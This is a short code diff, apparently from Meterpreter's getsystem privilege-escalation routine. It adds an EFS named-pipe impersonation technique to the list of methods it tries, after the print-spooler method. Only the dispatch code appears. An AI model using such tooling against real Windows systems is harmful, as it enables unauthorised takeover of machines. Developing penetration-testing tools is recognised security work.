@@ -7,6 +7,7 @@
 #include "namedpipe.h"
 #include "namedpipe_rpcss.h"
 #include "namedpipe_printspooler.h"
+#include "namedpipe_efs.h"
 #include "tokendup.h"
 
 /*!
@@ -120,6 +121,14 @@ DWORD elevate_getsystem( Remote * remote, Packet * packet )
 			dprintf("[ELEVATE] Attempting ELEVATE_TECHNIQUE_PRINTSPOOLER_NAMEDPIPE (%u)", ELEVATE_TECHNIQUE_NAMEDPIPE_PRINTSPOOLER);
 			if ( ( dwResult = elevate_via_namedpipe_printspooler(remote, packet)) == ERROR_SUCCESS) {
 				dwTechnique = ELEVATE_TECHNIQUE_NAMEDPIPE_PRINTSPOOLER;
+				break;
+			}
+		}
+
+		if (dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_NAMEDPIPE_EFS) {
+			dprintf("[ELEVATE] Attempting ELEVATE_TECHNIQUE_NAMEDPIPE_EFS (%u)", ELEVATE_TECHNIQUE_NAMEDPIPE_EFS);
+			if ((dwResult = elevate_via_namedpipe_efs(remote, packet)) == ERROR_SUCCESS) {
+				dwTechnique = ELEVATE_TECHNIQUE_NAMEDPIPE_EFS;
 				break;
 			}
 		}
